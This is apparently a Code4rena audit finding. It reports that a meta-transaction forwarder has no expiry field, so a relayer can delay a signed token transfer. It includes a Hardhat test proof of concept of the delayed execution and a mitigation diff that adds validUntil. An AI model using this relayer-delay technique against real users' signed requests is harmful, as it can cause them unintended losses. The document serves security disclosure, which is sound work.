# Next Generation

## Contest Summary

Code under review: [2025-02-next-gen](https://github.com/code-423n4/2025-01-next-generation) (472 nSLOC)

Contest Page: [next-gen-contest](https://code4rena.com/audits/2025-01-next-generation)

# Without a `uint256 validUntil` in ForwardRequest, a relayer can delay the transaction, making things worse for the user.

## Finding description and impact

- https://eips.ethereum.org/EIPS/eip-2770#forwarder-data-type-registration

The meta-transaction system’s ForwardRequest struct does not include an expiration (e.g., `uint256 validUntil`) field. As a result, once a user signs a meta-transaction, it remains valid indefinitely. A malicious relayer can exploit this behavior by withholding and delaying the execution of a transaction, which may lead to unintended consequences if the external conditions change.

```javascript
struct ForwardRequest {
        address from;
        address to;
        uint256 value;
        uint256 gas;
        uint256 nonce;
        bytes data;
    }
```

- Potential Attack Scenario

Alice signs a meta-transaction to send 100 tokens as part of a limited-time offer. A malicious relayer delays submitting it until after the offer expires or Alice changes her mind. Since there's no expiration check, the transaction still goes through, causing Alice an unintended loss or obligation.

- Impact : **High**
- LikeleHood : **High**

## Proof-of-Concept

```diff
// https://github.com/code-423n4/2025-01-next-generation/blob/main/test/Token.js#L41
+ let attacker
  beforeEach(async function () {
    [
      ...
+     attacker,
    ] = await ethers.getSigners();
    ......
  });
```

```javascript
describe("ATTACK", function () {
  beforeEach(async function () {
    await eurftoken.connect(owner).setAdministrator(admin.address);
    await eurftoken.connect(owner).setMasterMinter(masterMinter.address);
    await eurftoken.connect(masterMinter).mint(bob.address, 1000);
    await eurftoken.connect(masterMinter).mint(alice.address, 1000);
    const FORWARDER = await ethers.getContractFactory("Forwarder");
    forwarder = await upgrades.deployProxy(FORWARDER, [eurftoken.target], {
      initializer: "initialize",
    });
    await eurftoken.connect(admin).setTrustedForwarder(forwarder.target);
  });

  it("relayer-halt", async function () {
    var data = interface.encodeFunctionData("transfer", [
      attacker.address,
      100,
    ]);

    var result = await signForward(
      provider,
      eurftoken.target,
      forwarder.target,
      alice,
      1000000000000,
      data
    );
    console.log("Alice signed the forwarder request and send to relayers");

    // --- Malicious Relayer Delays the Transaction ---
    console.log("Malicious relayer intercepts and delays the meta-transaction");
    // (Time passes or conditions change)
    // However, since there is no expiration, the meta-transaction remains valid.

    // --- Malicious Relayer Executes the Meta-Transaction ---
    await expect(
      forwarder
        .connect(forwardOperator)
        .execute(
          result.request,
          result.domainSeparator,
          result.TypeHash,
          result.suffixData,
          result.signature
        )
    )
      .to.emit(eurftoken, "Transfer")
      .withArgs(alice.address, attacker.address, 100);

    console.log("Malicious relayer executed the delayed meta-transaction");

    // Check Attacker's token balance after execution
    const attackerBalance = await eurftoken.balanceOf(attacker.address);
    expect(attackerBalance).to.equal(100);
    console.log("Attacker's token balance:", attackerBalance);
  });
});
```

## mitigation

`validUntil` - the highest block number the request can be forwarded in, or 0 if request validity is not time-limited

```diff
    struct ForwardRequest {
+      uint256 validUntil;
    }
```

```diff
    function execute(
        ForwardRequest calldata req,
        bytes32 domainSeparator,
        bytes32 requestTypeHash,
        bytes calldata suffixData,
        bytes calldata sig
    ) external payable returns (bool success, bytes memory ret) {
        _verifyNonce(req);
        _verifySig(req, domainSeparator, requestTypeHash, suffixData, sig);
        _updateNonce(req);

        require(req.to == _eurfAddress, "NGEUR Forwarder: can only forward NGEUR transactions");
+       require(req.validUntil >= block.number, "NGEUR Forwarder: request timeout");
    }

```
